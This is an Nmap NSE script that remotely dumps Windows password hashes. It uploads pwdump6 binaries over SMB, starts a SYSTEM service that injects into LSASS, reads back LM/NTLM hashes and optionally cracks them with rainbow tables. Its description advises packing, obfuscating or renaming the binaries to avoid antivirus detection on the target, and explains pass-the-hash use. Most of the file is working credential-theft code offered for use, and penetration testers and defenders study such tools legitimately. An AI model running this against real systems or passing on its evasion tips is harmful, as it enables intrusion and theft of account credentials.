description = [[
This script implements the functionality found in pwdump.exe, written by the Foofus group. 
Essentially, it works by using pwdump6's modules (servpw.exe and lsremora.dll) to dump the
password hashes for a remote machine. This currently works against Windows 2000 and Windows 
2003. 

To run this script, the executable files for pwdump, servpw.exe and lsremora.dll, have to be 
downloaded. These can be found at <http://foofus.net/fizzgig/pwdump/>, and version 1.6 has been
tested. Those two files should be placed in nmap's nselib data directory, <code>.../nselib/data/</code>.  
Note that these files will likely trigger antivirus software -- if you want to get around that, 
I recommend compiling your own version or obfuscating/encrypting/packing them (upx works wonders). 
Another possible way around antivirus software is to change the filenames (especially on the remote 
system -- triggering antivirus on the remote system can land you with some questions to answer). To do 
that, simply change the <code>FILE*</code> constants in <code>smb-pwdump.nse</code>.

The hashes dumped are Lanman and NTLM, and they're in the format Lanman:NTLM. If one or the other 
isn't set, it's indicated. These are the hashes that are stored in the SAM file on Windows, 
and can be used in place of a password to log into systems (this technique is called "passing the
hash", and can be done in Nmap by using the <code>smbhash</code> argument instead of 
<code>smbpassword</code> -- see <code>smbauth.lua</code> for more information. 

In addition to directly using the hashes, the hashes can also be cracked. Hashes can be cracked 
fairly easily with Rainbow Crack (rcrack) or John the Ripper (john). If you intend to crack the 
hashes without smb-pwdump.nse's help, I suggest setting the <code>strict</code> parameter to '1', which
tells smb-pwdump.nse to print the hashes in pwdump format (except for the leading pipe '|', which
Nmap adds). Alternatively, you can tell the script to crack the passwords using the <code>rtable</code>
argument. For example:
<code>nmap -p445 --script=smb-pwdump --script-args=smbuser=ron,smbpass=iagotest2k3,rtable=/tmp/alpha/*.rt <host></code>

This assumes that 'rcrack' is installed in a standard place -- if not, the <code>rcrack</code> parameter
can be set to the path. The charset.txt file from Rainbow Crack may also have to be in the current
directory. 

This script works by uploading the pwdump6 program to a fileshare, then establishing a connection 
to the service control service (SVCCTL) and creating a new service, pointing to the pwdump6 program
(this sounds really invasive, but it's identical to how pwdump6, fgdump, psexec, etc. work). The service
runs, and sends back the data. Once the service is finished, the script will stop the service and 
delete the files. 

Obviously, this script is <em>highly</em> intrusive (and requires administrative privileges). 
It's running a service on the remote machine (with SYSTEM-level access) to accomplish its goals,
and the service injects itself into the LSASS process to collect the needed information. 
That being said, extra effort was focused on cleaning up. Unless something really bad happens 
(which is always possible with a script like this), the service will be removed and the files 
deleted. 

Currently, this will only run against server versions of Windows (Windows 2000 and Windows 2003). 
I (Ron Bowes) am hoping to make Windows XP work, but I've had nothing but trouble. Windows Vista
and higher won't ever work, because they disable the SVCCTL process. 

This script was written mostly to highlight Nmap's growing potential as a pen-testing tool. 
It complements the <code>smb-brute.nse</code> script because smb-brute can find weak administrator 
passwords, then smb-pwdump.nse can use those passwords to dump hashes/passwords.  Those can be added
to the password list for more brute forcing. 

Since this tool can be dangerous, and can easily be viewed as a malicious tool, the usual 
disclaimer applies -- use this responsibly, and especially don't break any laws with it. 

]]

---
-- @usage
-- nmap --script smb-pwdump.nse --script-args=smbuser=<username>,smbpass=<password> -p445 <host>
-- sudo nmap -sU -sS --script smb-pwdump.nse --script-args=smbuser=<username>,smbpass=<password> -p U:137,T:139 <host>
--
-- @output
-- |  smb-test:  
-- |  Administrator:500:D702A1D01B6BC2418112333D93DFBB4C:C8DBB1CFF1970C9E3EC44EBE2BA7CCBC:::
-- |  ASPNET:1001:359E64F7361B678C283B72844ABF5707:49B784EF1E7AE06953E7A4D37A3E9529:::
-- |  blankadmin:1003:NO PASSWORD*********************:NO PASSWORD*********************:::
-- |  blankuser:1004:NO PASSWORD*********************:NO PASSWORD*********************:::
-- |  Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
-- |  Ron:1000:D702A1D01B6BC2418112333D93DFBB4C:C8DBB1CFF1970C9E3EC44EBE2BA7CCBC:::
-- |_ test:1002:D702A1D01B6BC2418112333D93DFBB4C:C8DBB1CFF1970C9E3EC44EBE2BA7CCBC:::
-- 
-- @args rcrack Override the location checked for the Rainbow Crack program. By default, uses the default
--       directories searched by Lua (the $PATH variable, most likely)
-- @args rtable Set the path to the Rainbow Tables; for example, <code>/tmp/rainbow/*.rt</code>.
-- @args strict If set to '1', enable strict output. All output will be in pure pwdump format,
--       except for the leading pipe. 
-----------------------------------------------------------------------

author = "Ron Bowes"
copyright = "Ron Bowes"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive"}

require 'msrpc'
require 'smb'
require 'stdnse'
require 'nsedebug'

local SERVICE  = "nmap-pwdump"
local PIPE     = "nmap-pipe"

local FILE1     = "nselib/data/lsremora.dll"
local FILENAME1 = "lsremora.dll"

local FILE2     = "nselib/data/servpw.exe"
local FILENAME2 = "servpw.exe"


hostrule = function(host)
	return smb.get_port(host) ~= nil
end

---Stop/delete the service and delete the service file. This can be used alone to clean up the 
-- pwdump stuff, if this crashes. 
function cleanup(host)
	local status, err

	stdnse.print_debug(1, "Entering cleanup() -- errors here can generally be ignored")
	-- Try stopping the service
	status, err = msrpc.service_stop(host, SERVICE)
	if(status == false) then
		stdnse.print_debug(1, "Couldn't stop service: %s", err)
	end

--	os.exit()

	-- Try deleting the service
	status, err = msrpc.service_delete(host, SERVICE)
	if(status == false) then
		stdnse.print_debug(1, "Couldn't delete service: %s", err)
	end

	-- Delete the files
	status, err = smb.file_delete(host, "C$", "\\" .. FILENAME1)
	if(status == false) then
		stdnse.print_debug(1, "Couldn't delete %s: %s", FILENAME1, err)
	end

	status, err = smb.file_delete(host, "C$", "\\" .. FILENAME2)
	if(status == false) then
		stdnse.print_debug(1, "Couldn't delete %s: %s", FILENAME2, err)
	end

	stdnse.print_debug(1, "Leaving cleanup()")

	return true
end


function upload_files(host)
	local status, err

	status, err = smb.file_upload(host, FILE1, "C$", "\\" .. FILENAME1)
	if(status == false) then
		cleanup(host)
		return false, string.format("Couldn't upload %s: %s\n", FILE1, err)
	end

	status, err = smb.file_upload(host, FILE2,   "C$", "\\" .. FILENAME2)
	if(status == false) then
		cleanup(host)
		return false, string.format("Couldn't upload %s: %s\n", FILE2, err)
	end

	return true
end

function read_and_decrypt(host, key, pipe)
	local status, smbstate
	local results = {}

	-- Create the SMB session
	status, smbstate = msrpc.start_smb(host, msrpc.SVCCTL_PATH)
	if(status == false) then
		return false, smbstate
	end

	local i = 1
	repeat
		local status, wait_result, create_result, read_result, close_result
		results[i] = {}

		-- Wait for some data to show up on the pipe (there's a bit of a race condition here -- if this is called before the pipe is 
		-- created, it'll fail with a STATUS_OBJECT_NAME_NOT_FOUND. 

		local j = 1
		repeat
			status, wait_result = smb.send_transaction_waitnamedpipe(smbstate, 0, "\\PIPE\\" .. pipe)
			if(status ~= false) then
				break
			end

			stdnse.print_debug(1, "WaitForNamedPipe() failed: %s (this may be normal behaviour)", wait_result)
			j = j + 1
			-- TODO: Wait 50ms, if there's a time when we get an actual sleep()-style function. 
		until status == true

		if(j == 100) then
			smbstop(smbstate)
			return false, "WaitForNamedPipe() failed, service may not have been created properly."
		end

		-- Get a handle to the pipe
		status, create_result = smb.create_file(smbstate, "\\" .. pipe)
		if(status == false) then
			smb.stop(smbstate)
			return false, create_result
		end

		status, read_result = smb.read_file(smbstate, 0, 1000)
		if(status == false) then
			-- TODO: Figure out how to handle errors better
			return false, read_result
		else
			local data = read_result['data']
			local code = string.byte(string.sub(data, 1, 1))
			if(code == 0) then
				break
			elseif(code == 2) then
				local cUserBlocks = string.byte(string.sub(data, 3, 3))
				local userblock = ""
				for j = 0, cUserBlocks, 1 do
					local _, a, b = bin.unpack("<II", data, 68 + (j * 8))
					local encrypted = bin.pack(">II", a, b)
					local decrypted_hex = openssl.decrypt("blowfish", key, nil, encrypted)
					_, a, b = bin.unpack("<II", decrypted_hex)
					userblock = userblock .. bin.pack(">II", a, b)
				end
	
				local password_block = ""
				for j = 0, 3, 1 do
					local _, a, b = bin.unpack("<II", data, 4 + (j * 8))
					local encrypted = bin.pack(">II", a, b)
					local decrypted_hex = openssl.decrypt("blowfish", key, nil, encrypted)
					_, a, b = bin.unpack("<II", decrypted_hex)
					password_block = password_block .. bin.pack(">II", a, b)
				end
	
				_, results[i]['username'] = bin.unpack("z", userblock)
				_, results[i]['ntlm']     = bin.unpack("H16", password_block)
				_, results[i]['lm']       = bin.unpack("H16", password_block, 17)
	
				if(results[i]['lm'] == "AAD3B435B51404EEAAD3B435B51404EE") then
					results[i]['lm'] = "NO PASSWORD*********************"
				end
	
				if(results[i]['ntlm'] == "31D6CFE0D16AE931B73C59D7E0C089C0") then
					results[i]['ntlm'] = "NO PASSWORD*********************"
				end
			else
				stdnse.print_debug(1, "Unknown message code from pwdump: %d", code)
			end
		end

		status, close_result = smb.close_file(smbstate)
		if(status == false) then
			smb.stop(smbstate)
			return false, close_result
		end
		i = i + 1
	until(1 == 2)

	smb.stop(smbstate)

	return true, results
end

-- TODO: Check for OpenSSL
function go(host)
	local status, err
	local results
	local key

	local key = ""
	local i

	-- Start by cleaning up, just in case. 
	cleanup(host)

	-- It seems that, in my tests, if a key contains either a null byte or a negative byte (>= 0x80), errors
	-- happen. So, at the cost of generating a weaker key (keeping in mind that it's already sent over the 
	-- network), we're going to generate a key from printable characters only (we could use 0x01 to 0x1F 
	-- without error, but eh? Debugging is easier when you can type the key in)
	local key_bytes = openssl.rand_bytes(16)
	for i = 1, 16, 1 do
		key = key .. string.char((string.byte(string.sub(key_bytes, i, i)) % 0x5F) + 0x20)
	end

	-- Upload the files
	status, err = upload_files(host)
	if(status == false) then
		stdnse.print_debug(1, "Couldn't upload the files: %s", err)
		cleanup(host)
		return false, string.format("Couldn't upload the files: %s", err)
	end

	-- Create the service
	status, err = msrpc.service_create(host, SERVICE, "c:\\servpw.exe")
	if(status == false) then
		stdnse.print_debug(1, "Couldn't create the service: %s", err)
		cleanup(host)

		return false, string.format("Couldn't create the service on the remote machine: %s", err)
	end

	-- Start the service
	status, err = msrpc.service_start(host, SERVICE, {PIPE, key, tostring(string.char(16)), tostring(string.char(0)), "servpw.exe"})
	if(status == false) then
		stdnse.print_debug(1, "Couldn't start the service: %s", err)
		cleanup(host)

		return false, string.format("Couldn't start the service on the remote machine: %s", err)
	end

	-- Read the data
	status, results = read_and_decrypt(host, key, PIPE)
	if(status == false) then
		stdnse.print_debug(1, "Error reading data from remote service")
		cleanup(host)

		return false, string.format("Failed to read password data from the remote service: %s", err)
	end

	-- Clean up what we did
	cleanup(host)

	return true, results
end

---Converts an array of accounts to a pwdump-like representation. 
--@param accounts The accounts array. It should have a list of tables, each with 'username', 'lm', and 'ntlm'. 
--@param strict   If 'strict' is set to true, a true pwdump representation wiill be used; otherwise, a more user friendly one will. 
--@return A string in the standard pwdump format. 
function accounts_to_pwdump(accounts, strict)
	local str = ""

    for i=1, #accounts, 1 do
		if(accounts[i]['username'] ~= nil) then
			if(strict) then
		        str = str .. string.format("%s:%s:%s:::\n", accounts[i]['username'], accounts[i]['lm'], accounts[i]['ntlm'])
			else
				if(accounts[i]['password']) then
			        str = str .. string.format("%s => %s:%s (Password: %s)\n", accounts[i]['username'], accounts[i]['lm'], accounts[i]['ntlm'], accounts[i]['password'])
				else
			        str = str .. string.format("%s => %s:%s\n", accounts[i]['username'], accounts[i]['lm'], accounts[i]['ntlm'])
				end
			end
		end
    end

	return str
end


---Run the 'rcrack' program and parse the output. This may sound simple, but the output of rcrack clearly
-- wasn't designed to be scriptable, so it's a little difficult. But, it works, at least for 1.2. 
function rainbow(accounts, rcrack, rtable)
	local pwdump = accounts_to_pwdump(accounts, true)
	local pwdump_file = os.tmpname()
	local file
	local command = rcrack .. " " .. rtable .. " -f " .. pwdump_file

	-- Print a warning if 'charset.txt' isn't present
	file = io.open("charset.txt", "r")
	if(file == nil) then
		stdnse.print_debug(1, "WARNING: 'charset.txt' not found in current directory; rcrack may not run properly")
	else
		io.close(file)
	end

	-- Create the pwdump file
	stdnse.print_debug(1, "Creating the temporary pwdump file (%s)", pwdump_file)
	file, err = io.open(pwdump_file, "w")
	if(file == nil) then
		return false, err
	end
	file:write(pwdump)
	file:close()

	-- Start up rcrack
	stdnse.print_debug(1, "Starting rcrack (%s)", command)
	file, err = io.popen(command, "r")
	if(file == nil) then
		return false, err
	end

	for line in file:lines() do
		stdnse.print_debug(2, "RCRACK: %s\n", line)
		if(string.find(line, "hex:") ~= nil) then
			local start_hex1 = 0
			local start_hex2 = 0
			local hex1, hex2
			local ascii1, ascii2
			local password
			local i

			-- First, find the last place in the string that starts with "hex:"
			repeat
				local _, pos = string.find(line, "  hex:", start_hex1)
				if(pos ~= nil) then
					start_hex1 = pos + 1
				end
			until pos == nil

			-- Get the first part of the hex
			if(string.sub(line, start_hex1, start_hex1 + 9) == "<notfound>") then
				-- If it wasn't found, then set it as such and go to after the "not found" part
				ascii1 = "<notfound>"
				start_hex2 = start_hex1 + 10
			else
				-- If it was found, convert to ascii
				ascii1 = bin.pack("H", string.sub(line, start_hex1, start_hex1 + 13))
				start_hex2 = start_hex1 + 14
			end

			-- Get the second part of the hex
			if(string.sub(line, start_hex2) == "") then
				ascii2 = ""
			elseif(string.sub(line, start_hex2, start_hex2 + 9) == "<notfound>") then
				-- It wasn't found
				ascii2 = "<notfound>"
			else
				-- It was found, convert to ascii
				ascii2 = bin.pack("H", string.sub(line, start_hex2, start_hex2 + 13))
			end

			-- Join the two halves of the password together
			password = ascii1 .. ascii2

			-- Figure out the username (it's the part that is followed by a bunch of spaces then the password)
			i = string.find(line, "  +" .. password)

			username = string.sub(line, 1, i - 1)

			-- Finally, find the username in the account table and add our entry
			for i=1, #accounts, 1 do
				if(accounts[i]['username'] ~= nil) then
					if(string.find(accounts[i]['username'], username .. ":%d+$") ~= nil) then
						accounts[i]['password'] = password
					end
				end
			end
		end
	end

	-- Close the process handle
	file:close()

	-- Remove the pwdump file
	os.remove(pwdump_file)

    return true, accounts
end

action = function(host)

	local status, results
	local response = " \n"
	local rcrack = "rcrack"
	local rtable = nil

	-- Check if we have the necessary files
	if(nmap.fetchfile(FILE1) == nil or nmap.fetchfile(FILE2) == nil) then
		local err = " \n"
		err = err .. string.format("Couldn't run smb-pwdump.nse, missing required file(s):\n")
		if(nmap.fetchfile(FILE1) == nil) then
			err = err .. "- " .. FILE1 .. "\n"
		end
		if(nmap.fetchfile(FILE2) == nil) then
			err = err .. "- " .. FILE2 .. "\n"
		end
		err = err .. string.format("These are included in pwdump6 version 1.7.2:\n")
		err = err .. string.format("<http://foofus.net/fizzgig/pwdump/downloads.htm>")

		return err
	end

	status, results = go(host)

	if(status == false) then
		return "ERROR: " .. results
	end

	-- Only try cracking if strict is turned off
	if(nmap.registry.args.strict == nil) then
		-- Override the rcrack program
	    if(nmap.registry.args.rcrack ~= nil) then
			rcrack = nmap.registry.args.rcrack
		end

		-- Check if a table was passed
        if(nmap.registry.args.rtable ~= nil) then
			rtable = nmap.registry.args.rtable
		end

		-- Check a spelling mistake that I keep making
		if(nmap.registry.args.rtables ~= nil) then
			rtable = nmap.registry.args.rtables
		end

		-- Check if we actually got a table
		if(rtable ~= nil) then
			status, crack_results = rainbow(results, rcrack, rtable)
			if(status == false) then
				response = "ERROR cracking: " .. crack_results .. "\n"
			else
				results = crack_results
	        end
		end

		response = response .. accounts_to_pwdump(results, false)
	else
		response = response .. accounts_to_pwdump(results, true)
    end

	return response
end


